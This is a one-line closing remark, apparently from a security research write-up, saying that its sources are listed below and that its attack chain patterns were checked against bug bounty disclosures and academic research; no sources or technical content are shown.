*Sources consulted for this research are listed below. All chain patterns have been validated against real bug bounty disclosures and academic security research.*
